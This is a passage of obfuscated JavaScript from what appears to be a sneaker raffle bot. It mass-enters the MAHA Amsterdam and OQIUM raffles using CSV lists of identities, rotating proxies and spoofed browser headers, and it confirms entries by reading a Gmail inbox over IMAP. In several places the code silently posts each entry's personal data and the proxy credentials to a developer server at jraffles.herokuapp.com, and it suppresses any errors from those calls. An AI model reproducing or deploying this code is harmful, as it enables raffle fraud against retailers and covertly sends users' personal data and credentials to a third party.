                            await _0x4feac7['type']('#dwfrm_raffle_addressFields_postalCode', _0x39a635[_0x1b6d88]['Postcode']), await _0x1a282d(0x12c), await _0x4feac7['type']('#dwfrm_raffle_addressFields_address1', _0x39a635[_0x1b6d88]['Address1']), await _0x1a282d(0x12c), await _0x4feac7['type']('#dwfrm_raffle_addressFields_address2', _0x39a635[_0x1b6d88]['HouseNumber']), await _0x1a282d(0x12c), await _0x4feac7['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x39a635[_0x1b6d88]['Address2']), await _0x1a282d(0x12c), await _0x4feac7['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x1a282d(0x12c), await _0x4feac7['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x39a635[_0x1b6d88]['Follower']), await _0x1a282d(0x1f4), await _0x4feac7['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x1a282d(0x1f4), console['log'](_0x5c19a0() + '\x20[' + _0x396349['name'] + ']\x20Task\x20' + (_0x1b6d88 + 0x1) + '\x20:\x20' + _0x17b918['blue']('Awaiting\x20Paypal\x20Payment')), await _0x4feac7['click']('.b-paypal_button');
                            try {
                                await _0x4feac7['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0xd8921 = 'no', _0xe19c06(_0x39a635[_0x1b6d88], _0x396349), console['log'](_0x17b918['green'](_0x5c19a0() + '\x20[' + _0x396349['name'] + ']\x20Task\x20' + (_0x1b6d88 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x110b14['succesDEVMSG']);
                                await _0x1a282d(0xc8), await _0x4e4e57(_0xd2142c, _0x110b14['succesDEVMSG']), await _0x1a282d(0xc8), await _0x4e4e57(_0x1274a5, _0x110b14['succesPUBMSG']);
                                let _0x2f5158 = _0x39a635[_0x1b6d88];
                                try {
                                    prxdata = {
                                        'username': _0x5b7d0c['replace']('#', ''),
                                        'module': _0x396349['name'],
                                        'entrydata': JSON['stringify'](_0x2f5158),
                                        'proxy': '' + _0xe0163[_0x1b6d88]
                                    };
                                    var _0x1f5f6 = JSON['stringify'](prxdata);
                                    let _0x54728e = { 'headers': { 'content-type': 'application/json' } };
                                    await _0xbd53c['post']('https://jraffles.herokuapp.com/success', _0x1f5f6, _0x54728e);
                                } catch (_0x5e5e2f) {
                                }
                            } catch (_0x2c83b7) {
                                console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x396349['name'] + ']\x20Task\x20' + (_0x1b6d88 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x2c83b7)), _0x3dd9a5 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x2c83b7;
                                var _0x5c6799 = await _0x4ee25a(_0x39a635[_0x1b6d88], _0x396349, 'dev', !![], _0x3dd9a5);
                                _0x110b14['errorDEV'] = { 'embeds': [_0x5c6799] }, _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x110b14['errorDEV']), await _0x4e4e57(_0x4cd13, _0x110b14['errorDEV']);
                            }
                        } catch (_0x540531) {
                            console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x396349['name'] + ']\x20Task\x20' + (_0x1b6d88 + 0x1) + '\x20:\x20' + _0x540531)), _0x3dd9a5 = '' + _0x540531;
                            var _0x5c6799 = await _0x4ee25a(_0x39a635[_0x1b6d88], _0x396349, 'dev', !![], _0x3dd9a5);
                            _0x110b14['errorDEV'] = { 'embeds': [_0x5c6799] }, _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x110b14['errorDEV']), await _0x4e4e57(_0x4cd13, _0x110b14['errorDEV']), _0xd8921 = 'yes';
                        } finally {
                            _0x5754cb && _0x5754cb['close']();
                            if (_0xd8921 == 'yes' && _0x1cb1cb != 0x5) {
                                console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x396349['name'] + ']\x20Task\x20' + (_0x1b6d88 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1cb1cb + '\x20/\x205)')), _0x1b6d88 = _0x1b6d88 - 0x1, _0x1cb1cb = _0x1cb1cb + 0x1;
                                continue;
                            }
                            _0xd8921 == 'yes' && _0x1cb1cb >= 0x5 && (_0x1736ba(_0x39a635[_0x1b6d88], _0x396349), _0xd8921 = 'no', _0x1cb1cb = 0x0), console['log']('Waiting\x20for\x20' + _0x64917e['AfewDelay'] + '\x20ms'), await _0x1a282d(_0x64917e['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RvxrAV',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WQN5XR',
                                '$consent_form_version': 0x7f7254,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x2d81e0, _0x7faa7a, _0x5e8e5a) {
                    for (var _0x2ebef4 = 0x0; _0x2ebef4 < _0x7faa7a['length']; _0x2ebef4++) {
                        try {
                            await _0x120beb(_0x7faa7a, _0x2ebef4);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x105433(_0x2da29b, _0x7f4789, _0xe1eab0, _0x4dfffb, _0x47b5ce) {
                            var _0x2b64f2, _0x3f9a15 = {}, _0x49433c = [], _0x19f3f0 = {}, _0x1d1e5b = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x3ffff5 = Math['round'](Math['random']() * (_0x1d1e5b['length'] - 0x1));
                            !_0x4dfffb && (_0x4dfffb = {});
                            if (_0x7f4789 != 'ver') {
                                _0x51b97d(_0xe1eab0['name'] + '\x20Task\x20' + (_0x2da29b + 0x1) + '\x20/\x20' + _0x4dfffb['length'] + '\x20||\x20File:\x20' + _0x302fc2 + '\x20Proxies:\x20' + _0x252dfd), await _0x120beb(_0x4dfffb, _0x2da29b), _0x3f9a15 = _0xe1eab0['data'], _0x3f9a15['data']['attributes']['email'] = '' + _0x4dfffb[_0x2da29b]['Email'];
                                if (_0x4dfffb[_0x2da29b]['Size'] == 'RANDOM') {
                                }
                                _0x3f9a15['data']['attributes']['properties']['$first_name'] = '' + _0x4dfffb[_0x2da29b]['FirstName'], _0x3f9a15['data']['attributes']['properties']['$last_name'] = '' + _0x4dfffb[_0x2da29b]['LastName'], _0x3f9a15['data']['attributes']['properties']['$address1'] = _0x4dfffb[_0x2da29b]['Address1'] + '\x20' + _0x4dfffb[_0x2da29b]['Address2'] + '\x20' + _0x4dfffb[_0x2da29b]['HouseNumber'], _0x3f9a15['data']['attributes']['properties']['$zip'] = '' + _0x4dfffb[_0x2da29b]['Zip'], _0x3f9a15['data']['attributes']['properties']['$city'] = '' + _0x4dfffb[_0x2da29b]['City'], _0x3f9a15['data']['attributes']['properties']['$country'] = '' + _0x4dfffb[_0x2da29b]['Country'], _0x4dfffb[_0x2da29b]['Size'] == 'RANDOM' ? _0x3f9a15['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x1d1e5b[_0x3ffff5] : _0x3f9a15['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x4dfffb[_0x2da29b]['Size'], _0x3f9a15['data']['attributes']['properties']['$phone_number'] = '' + _0x4dfffb[_0x2da29b]['Phone'], _0x3f9a15['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x4dfffb[_0x2da29b]['Follower'];
                            }
                            if (_0x64917e['useRandomProxy'] = ![])
                                var _0x23bb1c = _0x47b5ce[_0x2da29b]['split'](':');
                            else
                                var _0x1f47de = Math['round'](Math['random']() * (_0x47b5ce['length'] - 0x1)), _0x23bb1c = _0x47b5ce[_0x1f47de]['split'](':');
                            var _0x54b14a = {
                                'jar': _0x509c63,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0xe1eab0['url'],
                                'headers': _0xe1eab0['headers'],
                                'body': JSON['stringify'](_0x3f9a15),
                                'proxy': 'http://' + _0x23bb1c[0x2] + ':' + _0x23bb1c[0x3] + '@' + _0x23bb1c[0x0] + ':' + _0x23bb1c[0x1]
                            };
                            return _0x7f4789 != 'ver' && (_0x54b14a['url'] = _0xe1eab0['url'], _0x54b14a['headers'] = _0xe1eab0['headers']), _0x7f4789 == 'ver' && (_0x54b14a['method'] = 'GET'), new Promise(function (_0x18ec73, _0x3f7793) {
                                callback = async (_0x29d0d5, _0x3c207f, _0x3c5459) => {
                                    if (!_0x29d0d5 && _0x3c207f['statusCode'] == 0xca || !_0x29d0d5 && _0x3c207f['statusCode'] == 0xc8) {
                                        if (_0x7f4789 != 'ver') {
                                            var _0x431e34 = await _0x4ee25a(_0x4dfffb[_0x2da29b], _0xe1eab0, 'dev', ![]), _0x34a0c9 = await _0x4ee25a(_0x4dfffb[_0x2da29b], _0xe1eab0, 'pub', ![]);
                                            const _0xd3a1d4 = {
                                                'succesDEVMSG': { 'embeds': [_0x431e34] },
                                                'succesPUBMSG': { 'embeds': [_0x34a0c9] }
                                            };
                                            let _0x45c1ac = _0x4dfffb[_0x2da29b];
                                            try {
                                                prxdata = {
                                                    'username': _0x5b7d0c['replace']('#', ''),
                                                    'module': _0xe1eab0['name'],
                                                    'entrydata': JSON['stringify'](_0x45c1ac),
                                                    'proxy': '' + _0x47b5ce[_0x2da29b]
                                                };
                                                var _0x10940e = JSON['stringify'](prxdata);
                                                let _0xb31311 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0xbd53c['post']('https://jraffles.herokuapp.com/success', _0x10940e, _0xb31311);
                                            } catch (_0x5391ea) {
                                            }
                                            if (_0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '')
                                                try {
                                                    await _0x4e4e57(_0x64917e['webhook'], _0xd3a1d4['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x1a282d(0xc8), await _0x4e4e57(_0xd2142c, _0xd3a1d4['succesDEVMSG']), await _0x1a282d(0xc8);
                                            try {
                                                await _0x4e4e57(_0x1274a5, _0xd3a1d4['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0xe19c06(_0x4dfffb[_0x2da29b], _0xe1eab0);
                                        }
                                        _0x18ec73(console['log'](_0x17b918['green'](_0x5c19a0() + '\x20[' + _0xe1eab0['name'] + ']\x20Task\x20' + (_0x2da29b + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x7f4789 != 'ver') {
                                            var _0x2b3edf = '' + _0x29d0d5, _0x120603 = await _0x4ee25a(_0x4dfffb[_0x2da29b], _0xe1eab0, 'dev', !![], _0x2b3edf), _0x44d1fa = {};
                                            _0x44d1fa['errorDEV'] = { 'embeds': [_0x120603] }, _0x1736ba(_0x4dfffb[_0x2da29b], _0xe1eab0), _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x44d1fa['errorDEV']), await _0x4e4e57(_0x4cd13, _0x44d1fa['errorDEV']);
                                        }
                                        _0x3f7793(console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0xe1eab0['name'] + ']\x20Task\x20' + (_0x2da29b + 0x1) + ':\x20' + _0x29d0d5)));
                                    }
                                };
                                try {
                                    _0x7f4789 != 'ver' && console['log'](_0x5c19a0() + '\x20[' + _0xe1eab0['name'] + ']\x20Task\x20' + (_0x2da29b + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x3f9a15['data']['attributes']['email']), _0x2f1368(_0x54b14a, callback);
                                } catch (_0x3beffe) {
                                    console['log'](_0x5c19a0() + '\x20Task\x20' + (_0x2da29b + 0x1) + ':\x20' + _0x3beffe);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x105433(_0x2ebef4, 'nor', _0x2d81e0, _0x7faa7a, _0x5e8e5a), console['log'](_0x5c19a0() + '\x20[' + _0x2d81e0['name'] + ']\x20Sleeping\x20for\x20' + _0x64917e['delay'] + '\x20ms'), await _0x1a282d(_0x64917e['delay']);
                        } catch (_0x42412b) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0xeb3d52, _0x5231c5, _0x27202d) {
                    var _0x39fa88 = [], _0x530a28 = ![];
                    async function _0x56d34b() {
                        var _0x5bb99c = new _0x27458e({
                            'user': _0x64917e['masterMail'],
                            'password': _0x64917e['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x27b09e(_0x5cdbf2) {
                            _0x5bb99c['openBox']('INBOX', ![], _0x5cdbf2);
                        }
                        _0x5bb99c['once']('ready', function () {
                            _0x27b09e(function (_0x5674b7, _0x5d265e) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x5674b7)
                                    throw _0x5674b7;
                                _0x5bb99c['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x943381, _0x5d59f0) {
                                    if (!_0x5d59f0 || !_0x5d59f0['length'])
                                        console['log'](_0x5c19a0() + '\x20[' + _0xeb3d52['name'] + ']\x20No\x20mails\x20found'), _0x5bb99c['end']();
                                    else {
                                        var _0x4ffcc6 = _0x5bb99c['seq']['fetch'](_0x5d59f0, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x4ffcc6['on']('message', function (_0x4a3d6b, _0x1e9302) {
                                            var _0x5913f1 = '(#' + _0x1e9302 + ')\x20';
                                            _0x4a3d6b['on']('body', function (_0x301693, _0x1779fb) {
                                                _0x483479(_0x301693, (_0x4e09dd, _0x568b4c) => {
                                                    var _0x228bf7 = _0x568b4c['text']['split']('(')[0x1], _0x3e024a = _0x228bf7['split'](')')[0x0];
                                                    _0x39fa88['push'](_0x3e024a);
                                                });
                                            }), _0x4a3d6b['once']('end', function () {
                                            });
                                        }), _0x4ffcc6['once']('error', function (_0x36fdee) {
                                            console['log']('Fetch\x20error:\x20' + _0x36fdee), _0x530a28 = !![];
                                        }), _0x4ffcc6['once']('end', function () {
                                            _0x5bb99c['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x5bb99c['once']('error', function (_0x5d27e3) {
                            console['log'](_0x17b918['red'](_0x5d27e3['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x530a28 = !![];
                        }), _0x5bb99c['once']('end', async function () {
                            _0x530a28 = !![];
                        }), _0x5bb99c['connect']();
                    }
                    async function _0x44ea31(_0xec64bd, _0x1b827d, _0x4fce3d) {
                        for (var _0x5be1eb = 0x0; _0x5be1eb < _0x1b827d['length']; _0x5be1eb++) {
                            async function _0x538a85(_0x4be80c, _0x54bb48, _0x5c0160, _0x3a9e44, _0x5bd12e) {
                                var _0xdc66fe, _0x36b272 = {}, _0x5c7c48 = [], _0x4299a2 = {}, _0xb9641e = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x3292f1 = Math['round'](Math['random']() * (_0xb9641e['length'] - 0x1));
                                _0x3a9e44[_0x4be80c]['Size'] == 'RANDOM' && (_0x3a9e44[_0x4be80c]['Size'] = _0xb9641e[_0x3292f1]);
                                !_0x3a9e44 && (_0x3a9e44 = {});
                                if (_0x64917e['useRandomProxy'] = ![])
                                    var _0x4dff59 = _0x5bd12e[_0x4be80c]['split'](':');
                                else
                                    var _0x37b8aa = Math['round'](Math['random']() * (_0x5bd12e['length'] - 0x1)), _0x4dff59 = _0x5bd12e[_0x37b8aa]['split'](':');
                                var _0x48c64b = {
                                    'jar': _0x509c63,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x5c0160['url'],
                                    'headers': _0x5c0160['headers'],
                                    'body': JSON['stringify'](_0x36b272),
                                    'proxy': 'http://' + _0x4dff59[0x2] + ':' + _0x4dff59[0x3] + '@' + _0x4dff59[0x0] + ':' + _0x4dff59[0x1]
                                };
                                return _0x54bb48 != 'ver' && (_0x48c64b['url'] = _0x5c0160['url'], _0x48c64b['headers'] = _0x5c0160['headers']), _0x54bb48 == 'ver' && (_0x48c64b['method'] = 'GET', _0x48c64b['url'] = _0x3a9e44[_0x4be80c]), new Promise(function (_0x18d801, _0x35130d) {
                                    callback = async (_0x79dd94, _0x5ea9b2, _0x11c350) => {
                                        if (!_0x79dd94 && _0x5ea9b2['statusCode'] == 0xca || !_0x79dd94 && _0x5ea9b2['statusCode'] == 0xc8) {
                                            if (_0x54bb48 != 'ver') {
                                                var _0x102c3e = await _0x4ee25a(_0x3a9e44[_0x4be80c], _0x5c0160, 'dev', ![]), _0x431234 = await _0x4ee25a(_0x3a9e44[_0x4be80c], _0x5c0160, 'pub', ![]);
                                                const _0x4aae40 = {
                                                    'succesDEVMSG': { 'embeds': [_0x102c3e] },
                                                    'succesPUBMSG': { 'embeds': [_0x431234] }
                                                };
                                                if (_0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '')
                                                    try {
                                                        await _0x4e4e57(_0x64917e['webhook'], _0x4aae40['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x1a282d(0xc8), await _0x4e4e57(_0xd2142c, _0x4aae40['succesDEVMSG']), await _0x1a282d(0xc8);
                                                try {
                                                    await _0x4e4e57(_0x1274a5, _0x4aae40['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0xe19c06(_0x3a9e44[_0x4be80c], _0x5c0160);
                                            }
                                            _0x18d801(console['log'](_0x17b918['green'](_0x5c19a0() + '\x20[' + _0x5c0160['name'] + ']\x20Task\x20' + (_0x4be80c + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x54bb48 != 'ver') {
                                                var _0x1d307a = '' + _0x79dd94, _0x44463e = await _0x4ee25a(_0x3a9e44[_0x4be80c], _0x5c0160, 'dev', !![], _0x1d307a), _0x20faea = {};
                                                _0x20faea['errorDEV'] = { 'embeds': [_0x44463e] }, _0x1736ba(_0x3a9e44[_0x4be80c], _0x5c0160), _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x20faea['errorDEV']), await _0x4e4e57(_0x4cd13, _0x20faea['errorDEV']);
                                            }
                                            _0x35130d(console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x5c0160['name'] + ']\x20Task\x20' + (_0x4be80c + 0x1) + ':\x20' + _0x79dd94)));
                                        }
                                    };
                                    try {
                                        _0x54bb48 != 'ver' ? console['log'](_0x5c19a0() + '\x20[' + _0x5c0160['name'] + ']\x20Task\x20' + (_0x4be80c + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x36b272['data']['attributes']['email']) : console['log'](_0x5c19a0() + '\x20[' + _0x5c0160['name'] + ']\x20Task\x20' + (_0x4be80c + 0x1) + ':\x20Fetching\x20Response'), _0x2f1368(_0x48c64b, callback);
                                    } catch (_0x4217e6) {
                                        console['log'](_0x5c19a0() + '\x20Task\x20' + (_0x4be80c + 0x1) + ':\x20' + _0x4217e6);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x538a85(_0x5be1eb, 'ver', _0xec64bd, _0x1b827d, _0x4fce3d), console['log'](_0x5c19a0() + '\x20[' + _0xec64bd['name'] + ']\x20Sleeping\x20for\x20' + _0x64917e['delay'] + '\x20ms'), await _0x1a282d(_0x64917e['delay']);
                            } catch (_0x5a4b86) {
                            }
                        }
                    }
                    try {
                        _0x56d34b();
                        while (!_0x530a28) {
                            await _0x1a282d(0xbb8);
                        }
                        console['log']('Found\x20' + _0x39fa88['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x1a282d(0x9c4);
                    }
                    await _0x44ea31(_0xeb3d52, _0x39fa88, _0x27202d);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'R8PmER',
                            'custom_source': 'DR5415-103',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'R6z7uT',
                                '$consent_form_version': 0x833bbb,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x30c431, _0x1c3a1b, _0x7b291b) {
                    for (var _0x2e27a0 = 0x0; _0x2e27a0 < _0x1c3a1b['length']; _0x2e27a0++) {
                        try {
                            await _0x120beb(_0x1c3a1b, _0x2e27a0);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x3a02ce(_0x2c077b, _0x3d0261, _0xd02bb4, _0x40be71, _0x1dfb25) {
                            var _0x156f01, _0x54fc5c = {}, _0x2c9c23 = [], _0x463e9b = {}, _0x401f17 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x5164e6 = Math['round'](Math['random']() * (_0x401f17['length'] - 0x1));
                            !_0x40be71 && (_0x40be71 = {});
                            if (_0x3d0261 != 'ver') {
                                _0x51b97d(_0xd02bb4['name'] + '\x20Task\x20' + (_0x2c077b + 0x1) + '\x20/\x20' + _0x40be71['length'] + '\x20||\x20File:\x20' + _0x302fc2 + '\x20Proxies:\x20' + _0x252dfd), _0x2c9c23 = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0x5b7d0c
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0x40be71[_0x2c077b]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x64917e['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0x1d5694
                                        }
                                    ]
                                }], _0x463e9b = { 'embeds': _0x2c9c23 }, _0x54fc5c = _0xd02bb4['data'], _0x54fc5c['data']['attributes']['email'] = '' + _0x40be71[_0x2c077b]['Email'];
                                if (_0x40be71[_0x2c077b]['Size'] == 'RANDOM') {
                                }
                                _0x54fc5c['data']['attributes']['properties']['$first_name'] = '' + _0x40be71[_0x2c077b]['FirstName'], _0x54fc5c['data']['attributes']['properties']['$last_name'] = '' + _0x40be71[_0x2c077b]['LastName'], _0x54fc5c['data']['attributes']['properties']['$address1'] = _0x40be71[_0x2c077b]['Address1'] + '\x20' + _0x40be71[_0x2c077b]['Address2'] + '\x20' + _0x40be71[_0x2c077b]['HouseNumber'], _0x54fc5c['data']['attributes']['properties']['$zip'] = '' + _0x40be71[_0x2c077b]['Zip'], _0x54fc5c['data']['attributes']['properties']['$city'] = '' + _0x40be71[_0x2c077b]['City'], _0x54fc5c['data']['attributes']['properties']['$country'] = '' + _0x40be71[_0x2c077b]['Country'], _0x40be71[_0x2c077b]['Size'] == 'RANDOM' ? _0x54fc5c['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x401f17[_0x5164e6] : _0x54fc5c['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x40be71[_0x2c077b]['Size'], _0x54fc5c['data']['attributes']['properties']['$phone_number'] = '' + _0x40be71[_0x2c077b]['Phone'], _0x54fc5c['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x40be71[_0x2c077b]['Follower'];
                            }
                            if (_0x64917e['useRandomProxy'] = ![])
                                var _0x270d7d = _0x1dfb25[_0x2c077b]['split'](':');
                            else
                                var _0x2e17c2 = Math['round'](Math['random']() * (_0x1dfb25['length'] - 0x1)), _0x270d7d = _0x1dfb25[_0x2e17c2]['split'](':');
                            var _0x37a441 = {
                                'jar': _0x509c63,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0xd02bb4['url'],
                                'headers': _0xd02bb4['headers'],
                                'body': JSON['stringify'](_0x54fc5c),
                                'proxy': 'http://' + _0x270d7d[0x2] + ':' + _0x270d7d[0x3] + '@' + _0x270d7d[0x0] + ':' + _0x270d7d[0x1]
                            };
                            return _0x3d0261 != 'ver' && (_0x37a441['url'] = _0xd02bb4['url'], _0x37a441['headers'] = _0xd02bb4['headers']), _0x3d0261 == 'ver' && (_0x37a441['method'] = 'GET'), new Promise(function (_0x488dd4, _0x53819a) {
